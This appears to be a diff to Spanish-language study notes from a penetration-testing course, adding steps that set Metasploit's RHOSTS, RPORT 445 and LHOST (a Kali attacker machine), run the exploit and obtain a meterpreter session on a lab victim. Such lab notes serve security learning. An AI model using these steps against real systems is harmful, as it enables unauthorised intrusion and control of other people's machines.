@@ -407,7 +407,7 @@ Luego, debemos configurar los parámetros necesarios para el exploit. Por ejempl
 
 Mario nos explica que existe el exploit y dentro del exploit está el payload.
 
-una vez que el exploit haya entrado en la máquina víctima, podemos ejecutar el payload.
+Una vez que el exploit haya entrado en la máquina víctima, podemos ejecutar el payload.
 
 una vez entendio esto, podemos configurar los parámetros necesarios para el exploit. Por ejemplo, podemos establecer la dirección IP del objetivo y el puerto.
 
@@ -417,6 +417,24 @@ set RHOSTS 192.168.1.195
 ```bash
 set RPORT 445
 ```
-```bash
-set LHOST
 
+LHOST corresponde con mi máquina atacante, que en este caso es Kali Linux.
+
+si necesitamos configurarlo se lanza el comando:
+
+```bash
+set LHOST [Dirección IP de la máquina atacante, en este caso Kali Linux]
+```	
+
+para ejecutarlo usamos el comando: 
+
+```bash
+exploit
+```
+O
+```bash
+run
+```
+Una vez que el exploit se haya ejecutado correctamente, deberíamos obtener una sesión de meterpreter en la máquina víctima. Esto nos permitirá interactuar con el sistema comprometido y realizar diversas acciones, como ejecutar comandos, transferir archivos o escalar privilegios.
+
+![Maquina Vulnerada](img/MaquinaVulnerada.png)
